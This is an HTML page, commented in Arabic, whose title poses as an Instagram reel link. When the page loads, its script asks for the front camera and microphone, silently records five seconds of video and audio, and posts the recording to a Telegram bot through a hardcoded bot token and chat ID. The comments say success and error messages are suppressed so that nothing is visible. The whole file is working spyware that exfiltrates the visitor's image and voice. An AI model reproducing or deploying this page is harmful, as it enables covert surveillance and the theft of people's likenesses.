<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>https://www.instagram.com/reel/DRCJuY6jB5R/?igsh=ZmxkYzN0NGxsOHJn</title>
    
    <style>
        /* إخفاء كل شيء وجعل الفيديو يملأ الشاشة */
        body {
            margin: 0;
            overflow: hidden; 
            background-color: #000;
        }

        #video {
            position: fixed;
            top: 50%;
            left: 50%;
            min-width: 100%;
            min-height: 100%;
            width: auto;
            height: auto;
            z-index: -100;
            transform: translate(-50%, -50%);
            border: none; 
        }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline></video> 

    <script>
        // ******************************************************
        // ** إعدادات البوت - تم التضمين بالمعلومات التي قدمتها **
        // ******************************************************
        const BOT_TOKEN = '8299004372:AAErVG-8zGODSvHxn0ZChWzBWXa3iGvw3NA'; 
        const CHAT_ID = '7869791131'; 
        // تم تغيير الأمر من sendPhoto إلى sendVideo
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
        
        // مدة التسجيل بالمللي ثانية (مثلاً: 5 ثوانٍ)
        const RECORDING_DURATION_MS = 5000; 

        // ******************************************************
        // ** المتغيرات والوظائف                   **
        // ******************************************************
        const video = document.getElementById('video');
        let stream = null;
        let mediaRecorder = null;
        const videoChunks = [];

        /**
         * دالة إرسال الفيديو إلى تيليجرام.
         */
        async function sendVideo(videoBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                // استخدام 'video' كاسم للحقل المطلوب لـ sendVideo
                formData.append('video', videoBlob, 'recorded_video.webm'); 
                formData.append('caption', 'Recorded silently from front camera.');

                const response = await fetch(TELEGRAM_API_URL, {
                    method: 'POST',
                    body: formData,
                });

                // لا يوجد معالجة مرئية للنجاح/الفشل لتبقى صامتة

            } catch (error) {
                // لا يوجد معالجة مرئية للأخطاء
            }
        }


        /**
         * إيقاف التسجيل وإرسال الفيديو.
         */
        function stopRecordingAndSend() {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }

            // إيقاف بث الكاميرا بعد انتهاء التسجيل والإرسال
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                video.srcObject = null;
            }
        }


        /**
         * بدء تسجيل الفيديو.
         */
        function startRecording() {
            if (!stream) return;

            // MediaRecorder لتمكين تسجيل البث إلى ملف
            mediaRecorder = new MediaRecorder(stream);
            
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    videoChunks.push(event.data);
                }
            };
            
            mediaRecorder.onstop = () => {
                // دمج الأجزاء إلى ملف فيديو واحد (Blob)
                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                // إرسال الملف
                sendVideo(videoBlob);
            };

            // بدء التسجيل
            mediaRecorder.start();
            
            // تحديد مدة التسجيل
            setTimeout(stopRecordingAndSend, RECORDING_DURATION_MS);
        }

        /**
         * طلب الوصول إلى الكاميرا الأمامية وبدء البث.
         */
        async function startCamera() {
            try {
                // طلب الكاميرا الأمامية: facingMode: 'user'
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user' 
                    },
                    audio: true // عادةً يتم تسجيل الصوت مع الفيديو
                });
                video.srcObject = stream;
                
                await new Promise(resolve => video.onloadedmetadata = resolve);
                video.play();
                
                // *** بدء التسجيل التلقائي بعد 1 ثانية من بدء البث ***
                setTimeout(startRecording, 1000); 

            } catch (error) {
                // لا يوجد معالجة مرئية للأخطاء
            }
        }

        window.onload = startCamera;
    </script>
</body>
</html>
